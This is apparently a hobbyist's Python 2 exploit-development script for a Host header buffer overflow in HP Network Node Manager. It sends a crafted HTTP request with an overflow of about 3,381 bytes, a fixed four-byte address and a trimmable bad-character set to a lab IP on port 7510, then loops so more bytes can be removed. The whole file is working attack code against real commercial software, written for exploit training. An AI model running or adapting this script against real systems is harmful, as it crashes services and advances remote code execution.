#!/usr/bin/python

#
# This python script is to be used for Bad Character identification
# If you want to do it the hard way.
# Apparently I do.
# It is designed for a the HP NNM target with a Host Header buffer overflow vulnerability
#
import socket
import os
import sys
import binascii
#import subprocess

ip="192.168.100.187"
port=int(7510)
url="/topology/home"

#
# Define total size which will help us with dynamic calculations
totalsize=int(4000)
#
#
# Below the initial charset is defined.
# I took the liberty of removing ,\x00,\x0a,\x0d and ,\x20, which is an informal SOP for me when it comes to payload development.

badchar = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

#
# Setting the initial while variable "bugging"
# As long as "bugging" equals yes, this script will allow you to 
# Trim the bad character set as much as you need to
#
bugging="yes"

#
# Ask the user if they want to exclude any more characters. We will do this via an array.
#

while bugging == "yes":
    print "[-] Please enter any bad characters you would like to exclude from the character set.\r\n"
    print "[-] By default, this script has 00, 0a, 0d and 20 removed in the original array"
    print "[-] You may also just hit enter to repeat the last payload\n"
    excludes=raw_input("[-] Make sure target is READY, then enter the characters to exclude in hex separated by a comma : ").split(',')


    #
    # This loop removes the bad characters elected by the user
    #
    for loop0 in excludes:
	# Need to add the \x deliminator to the bad character
        purge="\\x"+loop0
	# This command convert the string concatenated with \x and the user array to ascii
        purge=binascii.unhexlify(loop0)
        # This redefines the variable badchar and removes the variable we just created
        # It was tested on debugger and wireshark by simply removing 4a or capital J
	badchar = badchar.replace(purge, '')
    #
    # Debugging sequence.
    #

    #print "bad characters are : \n"
    #print badchar
    #exit()

    #
    # Build the crash payload
    #
    crash = "A"*3381 + "\x6f\x22\x44\x44" + badchar
    trim=len(crash)
    crash += "C" * (totalsize - trim)
    #
    # Test commands follow, fun to watch though
    # print crash
    # print "total size = "
    # print len(crash)
    # exit()
    # End test commands

    # Build the HTTP request, based on WireShark / Burp

    buffer="GET " + url + " HTTP/1.1\r\n"
    buffer+="Host: " + crash + "\r\n"
    buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
    buffer+="User-Agent: Mozilla/4.0 (Windows NT 10.0) Java/1.6.0_03\r\n"
    buffer+="Content-Length: 1001024\r\n\r\n"

    #
    # I actually had "sending even buffer"
    #
    print "[-] Here we going, sending evil buffer!\n\n"

    expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
    expl.connect((ip, port))
    expl.send(buffer)
    expl.close

    # Spoiler, if you want to watch in WireShark, filter by tcp.port not protocol
    # Ask me how I know 

    print "[-] Payload sent, check debugger homie\n"

    #
    # let's clear that exclude array
    excludes == []

    # Here the user elects to repeat or exit, leveraging use of the array, the characters previously trimmed, and we can RELOAD!
    bugging=raw_input("[-] Would you like to send another payload? If so enter yes or the script exits : ")

print "[-] Script complete"
exit()
